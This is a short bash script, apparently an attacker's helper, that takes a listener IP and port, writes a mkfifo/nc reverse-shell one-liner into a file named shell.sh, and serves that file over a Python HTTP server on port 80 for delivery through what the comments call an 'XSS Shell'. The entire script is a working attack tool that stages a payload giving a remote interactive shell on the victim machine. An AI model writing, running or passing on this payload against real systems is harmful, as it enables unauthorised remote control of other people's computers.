#!/bin/bash

# Check if IP and PORT are provided as command line arguments
# IP AND PORT SHOULD BE: your IP and port your nc is listening on.
# This is for an XSS Shell.
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IP> <PORT>"
    exit 1
fi

# Assign command line arguments to variables
IP="$1"
PORT="$2"

# Execute the command with provided IP and PORT
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" >>shell.sh
python3 -m http.server 80
